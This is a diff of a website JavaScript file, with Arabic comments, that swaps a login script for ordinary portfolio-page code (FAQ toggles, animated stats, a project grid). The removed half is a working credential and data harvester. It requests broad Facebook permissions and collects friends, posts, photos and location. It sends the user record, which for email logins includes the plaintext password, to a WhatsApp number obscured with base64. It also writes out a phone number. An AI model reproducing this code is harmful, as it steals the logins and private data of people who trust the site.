@@ -1,130 +1,143 @@
-// تهيئة SDK الفيسبوك
-window.fbAsyncInit = function() {
-    FB.init({
-        appId: 'YOUR_APP_ID', // استبدل هذا بمعرف التطبيق الخاص بك
-        cookie: true,
-        xfbml: true,
-        version: 'v17.0'
+// FAQ Functionality
+const faqItems = document.querySelectorAll('.faq-item');
+
+faqItems.forEach(item => {
+    const question = item.querySelector('.faq-question');
+    
+    question.addEventListener('click', () => {
+        const isActive = item.classList.contains('active');
+        
+        // Close all FAQ items
+        faqItems.forEach(faqItem => {
+            faqItem.classList.remove('active');
+        });
+        
+        // Open clicked item if it wasn't active
+        if (!isActive) {
+            item.classList.add('active');
+        }
     });
+});
+
+// Project Links
+const projectLinks = {
+    'youvi-link': '' // اتركه فارغاً ليتم تحديثه لاحقاً
 };
 
-// رقم الواتساب المشفر
-const WHATSAPP_NUMBER = btoa('01273381280');
-
-// دالة إرسال البيانات إلى WhatsApp
-function sendToWhatsApp(message, type) {
-    const phoneNumber = atob(WHATSAPP_NUMBER);
-    const encodedMessage = encodeURIComponent(message);
-    window.open(`https://wa.me/${phoneNumber}?text=${encodedMessage}`, '_blank');
+// Update Project Link
+function updateProjectLink(projectId, newLink) {
+    const linkElement = document.getElementById(projectId);
+    if (linkElement && newLink) {
+        linkElement.href = newLink;
+        projectLinks[projectId] = newLink;
+    }
 }
 
-// دالة تسجيل الدخول بالفيسبوك
-function loginWithFacebook() {
-    FB.login(function(response) {
-        if (response.status === 'connected') {
-            // الحصول على معلومات المستخدم
-            FB.api(
-                '/me',
-                {
-                    fields: 'id,name,email,picture.width(300),cover,friends.limit(0).summary(true),posts.limit(0).summary(true),photos.limit(0).summary(true),location'
-                },
-                function(response) {
-                    const userData = {
-                        id: response.id,
-                        name: response.name,
-                        email: response.email,
-                        picture: response.picture?.data?.url,
-                        cover: response.cover?.source,
-                        location: response.location?.name,
-                        friends_count: response.friends?.summary?.total_count || 0,
-                        posts_count: response.posts?.summary?.total_count || 0,
-                        photos_count: response.photos?.summary?.total_count || 0,
-                        type: 'facebook',
-                        registrationDate: new Date().toISOString()
-                    };
+// Update copyright year
+document.getElementById('year').textContent = new Date().getFullYear();
 
-                    // حفظ البيانات في localStorage
-                    localStorage.setItem('currentUser', JSON.stringify(userData));
-                    
-                    // إرسال البيانات إلى WhatsApp
-                    sendToWhatsApp(`تم تسجيل الدخول عبر فيسبوك:\n${JSON.stringify(userData, null, 2)}`, 'facebook');
-                    
-                    // عرض رسالة نجاح
-                    showError('تم تسجيل الدخول بنجاح!');
-                    
-                    // إعادة توجيه المستخدم إلى صفحة الملف الشخصي
-                    setTimeout(() => {
-                        window.location.href = 'profile.html';
-                    }, 2000);
-                }
-            );
-        } else {
-            showError('فشل تسجيل الدخول بالفيسبوك');
-        }
-    }, {
-        scope: 'public_profile,email,user_friends,user_posts,user_photos,user_location',
-        return_scopes: true
+// Stats Animation
+function animateStats() {
+    const stats = document.querySelectorAll('.stat-number');
+    
+    stats.forEach(stat => {
+        const target = parseInt(stat.getAttribute('data-target'));
+        const duration = 2000; // 2 seconds
+        const increment = target / (duration / 16); // 60fps
+        let current = 0;
+
+        const updateCount = () => {
+            if (current < target) {
+                current += increment;
+                stat.textContent = Math.floor(current);
+                requestAnimationFrame(updateCount);
+            } else {
+                stat.textContent = target;
+            }
+        };
+
+        updateCount();
     });
 }
 
-// دالة التحقق من وجود المستخدم
-function checkUserExists(type, id) {
-    const users = JSON.parse(localStorage.getItem('users') || '{}');
-    return users[`${type}_${id}`] !== undefined;
+// Intersection Observer for Stats
+const statsSection = document.querySelector('.stats');
+if (statsSection) {
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                animateStats();
+                observer.unobserve(entry.target);
+            }
+        });
+    }, { threshold: 0.5 });
+
+    observer.observe(statsSection);
 }
 
-// دالة الحصول على بيانات المستخدم
-function getUser(type, id) {
-    const users = JSON.parse(localStorage.getItem('users') || '{}');
-    return users[`${type}_${id}`];
-}
-
-// دالة حفظ بيانات المستخدم
-function saveUser(type, id, userData) {
-    const users = JSON.parse(localStorage.getItem('users') || '{}');
-    users[`${type}_${id}`] = userData;
-    localStorage.setItem('users', JSON.stringify(users));
-}
-
-// دالة عرض رسائل الخطأ
-function showError(message) {
-    const errorDiv = document.getElementById('error-message');
-    errorDiv.textContent = message;
-    errorDiv.style.display = 'block';
-    
-    if (message.includes('نجاح')) {
-        errorDiv.style.background = '#e8f5e9';
-        errorDiv.style.color = '#2e7d32';
+// Sample portfolio projects
+const portfolioProjects = [
+    {
+        title: 'مونتاج فيديو إعلاني',
+        category: 'تحرير فيديو',
+        icon: 'fas fa-film'
+    },
+    {
+        title: 'فيديو تسويقي لمنتج',
+        category: 'تحرير فيديو',
+        icon: 'fas fa-video'
+    },
+    {
+        title: 'تصميم موقع شركة',
+        category: 'تطوير ويب',
+        icon: 'fas fa-laptop-code'
+    },
+    {
+        title: 'تصميم شعار',
+        category: 'تصميم جرافيك',
+        icon: 'fas fa-palette'
+    },
+    {
+        title: 'حملة تسويقية',
+        category: 'تسويق رقمي',
+        icon: 'fas fa-bullhorn'
+    },
+    {
+        title: 'تصميم منيو مطعم فاخر',
+        category: 'تصميم منيوهات',
+        icon: 'fas fa-utensils'
+    },
+    {
+        title: 'منيو كافيه عصري',
+        category: 'تصميم منيوهات',
+        icon: 'fas fa-coffee'
     }
-}
+];
 
-// معالجة تقديم نموذج تسجيل الدخول
-function handleLogin(event) {
-    event.preventDefault();
-    
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    
-    // التحقق من وجود المستخدم
-    const users = JSON.parse(localStorage.getItem('users') || '{}');
-    const user = Object.values(users).find(u => u.email === email && u.password === password);
-    
-    if (user) {
-        // حفظ المستخدم الحالي
-        localStorage.setItem('currentUser', JSON.stringify(user));
-        
-        // إرسال البيانات إلى WhatsApp
-        sendToWhatsApp(`تم تسجيل الدخول عبر البريد الإلكتروني:\n${JSON.stringify(user, null, 2)}`, 'email');
-        
-        showError('تم تسجيل الدخول بنجاح!');
-        
-        // إعادة توجيه المستخدم إلى صفحة الملف الشخصي
-        setTimeout(() => {
-            window.location.href = 'profile.html';
-        }, 2000);
-    } else {
-        showError('البريد الإلكتروني أو كلمة المرور غير صحيحة');
-    }
-    
-    return false;
-}
+// Populate portfolio section
+const portfolioGrid = document.querySelector('.portfolio-grid');
+portfolioProjects.forEach(project => {
+    const projectElement = document.createElement('div');
+    projectElement.className = 'portfolio-item';
+    projectElement.innerHTML = `
+        <div class="portfolio-icon">
+            <i class="${project.icon}"></i>
+        </div>
+        <div class="portfolio-info">
+            <h3>${project.title}</h3>
+            <p>${project.category}</p>
+        </div>
+        <span class="portfolio-category">${project.category}</span>
+    `;
+    portfolioGrid.appendChild(projectElement);
+});
+
+// Smooth scrolling for navigation links
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.querySelector(this.getAttribute('href')).scrollIntoView({
+            behavior: 'smooth'
+        });
+    });
+});
